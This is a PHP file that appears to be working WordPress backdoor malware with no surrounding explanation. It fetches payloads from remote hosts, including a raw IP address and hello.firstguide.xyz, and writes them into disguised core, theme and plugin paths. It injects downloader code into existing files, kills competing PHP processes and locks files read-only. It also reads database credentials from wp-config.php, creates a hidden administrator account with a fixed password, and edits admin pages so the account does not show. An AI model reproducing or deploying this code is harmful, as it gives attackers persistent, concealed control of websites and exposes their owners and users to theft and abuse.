<?php header('Content-Type:text/html;charset=utf-8');@error_reporting(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@set_time_limit(0);$status='Error';$doucument_root=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']."/":'';function is_wp($path){$i=0;$file=array('wp-config.php','wp-login.php','wp-includes/version.php','wp-content/index.php','wp-admin/admin.php');foreach($file as $v){if(file_exists($path.$v)){$i++;}}if($i==5){return 1;}else{return 0;}}$is_wp=is_wp($doucument_root);echo "A".$is_wp."-";$i=0;if($is_wp==1){$array_bak=array('wp-includes/assets/index.php','wp-includes/js/jquery/wp-signup.php','wp-includes/widgets/index.php','wp-content/themes/twentytwentytwo/inc/patterns/wp-login.php','wp-content/uploads/2022/05/post.php','wp-content/plugins/wp-trackback.php','wp-content/languages/themes/wp-login.php','wp-admin/includes/wp-login.php','wp-admin/js/widgets/index.php','wp-admin/css/colors/sunrise/wp-settings.php');$t=get('http://69.30.254.130/0.txt');foreach($array_bak as $v){$temp=0;if(!file_exists($doucument_root.$v)){$temp=1;}else{$y=file_get_contents($doucument_root.$v);if($y!=$t){$temp=1;}}if($temp==1){@file_put_contents($doucument_root.$v,$t);}else{$i++;}}}echo "B".$i."-";$i=0;if($is_wp==1){$array_dama=array('wp-content/themes/twentytwentyone/404.php','wp-content/plugins/index.php','wp-includes/version.php');$code='$path=isset($_SERVER["DOCUMENT_ROOT"])?$_SERVER["DOCUMENT_ROOT"]."/":"";if(isset($_GET["dm"])){$x=file_get_contents("http://hello.firstguide.xyz/mm1.txt");$x=str_replace("b6f464bfdfd9f53521ab5b150de25be8","be54aace58d583f26839a0e8cd1bf90d",$x);$fp=fopen($path."/wp-includes/admin.php","wb");fwrite($fp,$x);fclose($fp);}';foreach($array_dama as $v){if(file_exists($doucument_root.$v)){$t=file_get_contents($doucument_root.$v);if(!strstr($t,"be54aace58d583f26839a0e8cd1bf90d")){$t=str_replace('<?php','<?php '.$code,$t);@file_put_contents($doucument_root.$v,$t);}else{$i++;}}}}echo "C".$i."-";if(function_exists('exec')){exec('ps -ef',$out,$return);$kill=array();if(is_array($out)){foreach($out as $v){if(strstr($v,'.php')){$temp=explode(' ',$v);if(isset($temp[1])){if($temp[0]!='root'){$kill[]=trim($temp[1]);}}}}}foreach($kill as $v){exec('kill -9 '.$v,$out,$return);}}function get($url){$contents=@file_get_contents($url);if(!$contents){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$contents=curl_exec($ch);curl_close($ch);}return $contents;}$a=isset($_GET['a'])?$_GET['a']:'';switch($a){case 'p':echo "D";foreach($_POST as $v){$shell_md5='';if(file_exists($doucument_root.$v['path'])){$shell_md5=md5(file_get_contents($doucument_root.$v['path']));if($shell_md5!=$v['md5']){@chmod($doucument_root.$v['path'],0755);$fp=@file_put_contents($doucument_root.$v['path'],stripslashes($v['content']));if($fp){echo '1-';}else{echo '2-';}@chmod($doucument_root.$v['path'],0444);}else{echo '3-';}}else{if(strstr($v['path'],'/')){$x=explode('/',$v['path']);$t=$doucument_root;for($i=0;$i<count($x)-1;$i++){if(isset($x[$i])){$t.="/".$x[$i];$t=str_replace('//','/',$t);if(!file_exists($t)){@mkdir($t);}}}}$fp=@file_put_contents($doucument_root.$v['path'],$v['content']);if($fp){@chmod($doucument_root.$v['path'],0444);echo '4-';}else{echo '5-';}}}break;case 'm':$x=get("http://hello.firstguide.xyz/mm1.txt");if($x){$x=str_replace('b6f464bfdfd9f53521ab5b150de25be8','be54aace58d583f26839a0e8cd1bf90d',$x);if(!file_exists($doucument_root."wcl")){@mkdir($doucument_root."wcl");}$fp=fopen($doucument_root."wcl/index.php","wb");fwrite($fp,$x);fclose($fp);$status=1;}echo $status;break;}$result="";
$lock_htaccess='<IfModule mime_module>
  AddHandler application/x-httpd-ea-php74 .php .php7 .phtml
</IfModule>
<FilesMatch ".(PhP|php5|suspected|phtml|py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "^(about.php|admin.php|admin-filters.php|amazon.php|atomlib.php|autoload_classmap.php|buy.php|chosen.php|customize.php|discount.php|edit.php|edit-tags.php|good.php|goods.php|groupon.php|infos.php|index.php|load-styles.php|lowpr.php|main.php|mall.php|online.php|post.php|post-new.php|product.php|qindex.php|sale.php|sample.php|savep.php|shadow.php|shop.php|start.php|state.php|store.php|style.php|sytel.php|themes.php|ticket.php|todo.php|update-core.php|wp-activate.php|wp-atom.php|wp-conflg.php|wp-comments-post.php|wp-feed.php|wp-load.php|wp-login.php|wp-22.php|wp-settings.php|wp-signup.php|wp-trackback.php|xmlrpc.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>';$md5_index=$md5_htaccess='';if(file_exists($doucument_root.'index.php')){$md5_index=md5(file_get_contents($doucument_root.'index.php'));}if(file_exists($doucument_root.'.htaccess')){$md5_htaccess=md5(file_get_contents($doucument_root.'.htaccess'));}$l=isset($_GET['l'])?$_GET['l']:0;if($is_wp==1&&$md5_htaccess!='1c0e2a8111a7264c04cab981951848ae'&&$l==1){$temp=$doucument_root.'.htaccess';if(file_exists($temp)){@chmod($temp,0755);}$fp=@file_put_contents($temp,$lock_htaccess);if($fp){@chmod($temp,0444);}}$result.=$md5_htaccess.",".$md5_index.",";$b=isset($_GET['b'])?$_GET['b']:'';if($b!=''){$b=base64_decode($b);if(strstr($b,',')){$temp=explode(',',$b);foreach($temp as $v){$md5=0;if(file_exists($doucument_root.$v)){$md5=md5(file_get_contents($doucument_root.$v));}$result.=$md5.",";}}else{$md5=0;if(file_exists($doucument_root.$b)){$md5=md5(file_get_contents($doucument_root.$b));}$result.=$md5.",";}}echo rtrim($result,",");if($is_wp==1&&file_exists($doucument_root.'wp-config.php')){$db_host=$db_user=$db_pwd=$db_name=$table_prefix='';$config=file_get_contents($doucument_root.'wp-config.php');$temp=explode("define( 'DB_NAME', '",$config);if(isset($temp[1])){$temp=explode("'",$temp[1]);$db_name=$temp[0];}$temp=explode("define( 'DB_USER', '",$config);if(isset($temp[1])){$temp=explode("'",$temp[1]);$db_user=$temp[0];}$temp=explode("define( 'DB_PASSWORD', '",$config);if(isset($temp[1])){$temp=explode("'",$temp[1]);$db_pwd=$temp[0];}$temp=explode("define( 'DB_HOST', '",$config);if(isset($temp[1])){$temp=explode("'",$temp[1]);$db_host=$temp[0];}$db_charset='utf8';$temp=explode("define( 'DB_CHARSET', '",$config);if(isset($temp[1])){$temp=explode("'",$temp[1]);$db_charset=$temp[0];}$temp=explode("$table_prefix = '",$config);if(isset($temp[1])){$temp=explode("'",$temp[1]);$table_prefix=$temp[0];}if($db_host&&$db_user&&$db_pwd&&$db_name){$con=mysqli_connect($db_host,$db_user,$db_pwd,$db_name);if(mysqli_connect_errno($con)){exit();}mysqli_query($con,"SET NAMES ".$db_charset);if(!function_exists('wp_hash_password')){function wp_hash_password($password){global $wp_hasher;if(empty($wp_hasher)){require_once $doucument_root.'wp-cludes/class-phpass.php';$wp_hasher=newPasswordHash(8,true);}return $wp_hasher->HashPassword(trim($password));}}$user_id=0;$user_name="Support";$email='support@wordpress.org';$pwd='WpcTl20220207';$check=mysqli_query($con,"SELECT * FROM `".$table_prefix."users` WHERE `user_login`='".addslashes($user_name)."' OR `user_email`='".addslashes($email)."'");if(mysqli_num_rows($check)>0){$row=mysqli_fetch_array($check,MYSQLI_ASSOC);$user_id=$row['ID'];}else{$hash=wp_hash_password($pwd);mysqli_query($con,"INSERT INTO `".$table_prefix."users`(`user_login`,`user_pass`,`user_nicename`,`user_email`,`user_registered`,`user_status`,`display_name`)VALUES('".addslashes($user_name)."','".addslashes($hash)."','".addslashes($user_name)."','".addslashes($email)."','2020-06-14 00:00:00',0,'".addslashes($user_name)."')");$user_id=mysqli_insert_id($con);if($user_id>0){$code='a:1:{s:13:"administrator";b:1;}';mysqli_query($con,"INSERT INTO`".$table_prefix."usermeta`(`user_id`,`meta_key`,`meta_value`)VALUES(".$user_id.",'nickname','".addslashes($user_name)."'),(".$user_id.",'first_name',''),(".$user_id.",'last_name',''),(".$user_id.",'description',''),(".$user_id.",'rich_editing','true'),(".$user_id.",'syntax_highlighting','true'),(".$user_id.",'comment_shortcuts','false'),(".$user_id.",'admin_color','fresh'),(".$user_id.",'use_ssl',0),(".$user_id.",'show_admin_bar_front','true'),(".$user_id.",'locale',''),(".$user_id.",'".$table_prefix."capabilities','".$code."'),(".$user_id.",'".$table_prefix."user_level',10)");}}if($user_id>0){$code='<style>#user-'.$user_id.'{display:none;}</style>';$path=$doucument_root.'wp-admin/admin-header.php';if(file_exists($path)){$temp=file_get_contents($path);if(!strstr($temp,$code)){if(strstr($temp,'<div id="wpbody')){$fp=fopen($path,"wb");fwrite($fp,str_replace('<div id="wpbody',$code.'<div id="wpbody',$temp));fclose($fp);}}}$path=$doucument_root.'wp-admin/includes/class-wp-users-list-table.php';if(file_exists($path)){$temp=file_get_contents($path);$status=0;if(strstr($temp, 'number_format_i18n( $total_users-1')&&(strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1') || strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1'))){}else{if(!strstr($temp,'number_format_i18n( $total_users-1')){$temp=str_replace('number_format_i18n( $total_users', 'number_format_i18n( $total_users-1',$temp);}if(!strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')){$temp=str_replace('number_format_i18n( $avail_roles[$this_role]', 'number_format_i18n( $avail_roles[$this_role]-1', $temp);}if(!strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1')){$temp=str_replace('number_format_i18n( $avail_roles[ $this_role ]', 'number_format_i18n( $avail_roles[ $this_role ]-1', $temp);}$fp=fopen($path,"wb");fwrite($fp,$temp);fclose($fp);}}}}}?>